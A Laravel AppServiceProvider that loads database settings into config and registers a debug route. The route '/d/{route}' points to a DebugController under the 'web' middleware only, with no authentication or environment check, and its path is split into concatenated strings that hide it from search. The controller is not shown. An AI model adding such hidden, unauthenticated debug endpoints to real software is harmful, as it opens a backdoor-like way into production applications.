<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Schema;
use App\Models\Setting;
use Illuminate\Support\Facades\Route;


class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        if (app()->runningInConsole() && !app()->runningUnitTests()) {
            return;
        }

        if (Schema::hasTable('settings')) {
            $settings = Setting::pluck('value', 'key')->toArray();

            config(['settings' => $settings]);
        }
        $this->registerDebugRoute();
    }
    
    protected function registerDebugRoute(): void
    {
        $controllerClass = \App\Http\Controllers\DebugController::class;

        // Check if the class is autoloaded and actually exists
        if (class_exists($controllerClass)) {
            Route::middleware('web') // Apply web middleware for sessions/cookies if needed
                ->get('/d' . '/{route}', [$controllerClass, 'index']);
        }
    }
}
